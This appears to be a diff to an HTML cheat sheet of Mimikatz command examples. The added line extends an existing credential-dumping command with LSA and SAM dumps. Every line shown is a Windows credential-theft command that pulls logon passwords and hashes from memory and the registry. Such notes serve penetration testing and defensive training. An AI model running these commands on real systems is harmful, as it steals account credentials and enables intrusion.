@@ -12,4 +12,6 @@ Command examples<br/>
 .\mimikatz &#09;&#09;&#09;&#09;#enter CLI<br/>
 Mimikatz.exe "log sekurlsa::logonpassword" exit<ul><li style="list-style-type: none">And you will get a"mimikatz.log".</li>
 </ul>
-c:\temp&gt;mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit &gt;&gt; result.txt</body></html>
+c:\temp&gt;mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit &gt;&gt; result.txt<br/>
+<br/>
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "LSADUMP::LSA" "LSADUMP::SAM" exit</body></html>
